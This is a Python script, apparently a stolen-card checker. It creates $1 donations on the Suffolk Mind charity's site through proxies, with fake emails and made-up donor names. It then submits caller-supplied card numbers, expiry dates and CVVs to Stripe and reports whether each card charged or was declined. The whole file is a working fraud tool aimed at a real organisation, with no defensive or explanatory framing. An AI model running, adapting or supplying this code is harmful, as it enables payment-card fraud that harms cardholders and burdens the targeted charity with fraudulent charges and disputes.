import requests,random,string
import json
from proxy import proxies
def generate_email():
    # List of common email domains
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com']
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
    domain = random.choice(domains)
    return f"{username}@{domain}"

async def stripe_charge4(cc,mm,yy,cvv):
    proxy = proxies()
    r = requests.Session()
    r.proxies = proxy
    email = generate_email()
    headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8,hi;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.suffolkmind.org.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.suffolkmind.org.uk/donate/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    json_data = {
        'user_id': 0,
        'donationtype': '2',
        'donationamount': 1,
        'paymentmethod': 1,
        'donationmessage': None,
        'inmemoryof': None,
        'donationamountgiftaid': None,
        'giftaid': 0,
        'forename': 'Albedo',
        'surname': 'Jones',
        'email': email,
        'title': 'Mr',
        'telephone': None,
        'address1': 'New York',
        'address2': None,
        'town': 'New York',
        'county': 'NY',
        'country': 'United States',
        'postcode': 'New York',
        'marketing_optin_email': False,
        'marketing_optin_post': False,
        'marketing_optin_telephone': False,
        'marketing_optin_sms': False,
        'marketing_optin_privacy': True,
        'marketing_optin_newsletter': False,
        'user_age_range': None,
        'user_gender': None,
        'tribute_id': None,
        'giving_id': None,
        'newsletters_subscribe_array': [],
        'customdonationamount': '1',
    }

    try:
            response =  r.post(
                'https://www.suffolkmind.org.uk/wp-json/donation/v1/save/',
                headers=headers,
                json=json_data,
                
            )

            id = (response.json()['post_id'])
    except:
            return '[stripe_error] => 1st Request Failed'


    headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8,hi;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.suffolkmind.org.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.suffolkmind.org.uk/donate/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    json_data = {
            'amount': 1,
            'donation_id': id,
            'description': 'Suffolk Mind Donation',
            'email': email,
            'forename': 'Error',
            'surname': 'Error',
        }
    try:
            response =  r.post(
                'https://www.suffolkmind.org.uk/wp-json/donation/v1/setup_stripe/',
                headers=headers,
                json=json_data,
                
            )
            data = json.loads(response.json())

            client_secret = data['message']['client_secret']
            id = data['message']['id']  
    except:
            return '[stripe_error] => Faild to get Id'
    headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8,hi;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = f'payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=04f8ba24-879b-4617-8a96-aaf3d082e32341ee9c&payment_method_data[muid]=7c82315f-824e-4545-929c-9c1894d2e46ef9356f&payment_method_data[sid]=39d0781e-cf6e-4f39-b644-e2b64587f14f3ff16c&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fcc4d70c382%3B+stripe-js-v3%2Fcc4d70c382%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Fwww.suffolkmind.org.uk&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_O45qBcmyO7GC7KkMKzPtpRsl&client_secret={client_secret}'
    try:
            response =  r.post(
                f'https://api.stripe.com/v1/payment_intents/{id}/confirm',
                headers=headers,
                data=data,
                
            )
            if 'requires_action' in response.text or 'requires_source_action' in response.text:
                return '3D Secure Required'
            if 'error' in response.text:
                if 'decline_code' in response.json()['error']:
                    msg = response.json()['error']['decline_code'].replace('_', ' ').title()
                    return msg
                else:
                    return response.json()['error']['message']
                
            elif 'succeeded' in response.text or response.json()['status'] == 'succeeded':
                return 'Charged $1'
            else:
                return '[stripe_error] => Unexpected response'
    except Exception as e:
            return f'[stripe_error] => {str(e)}'
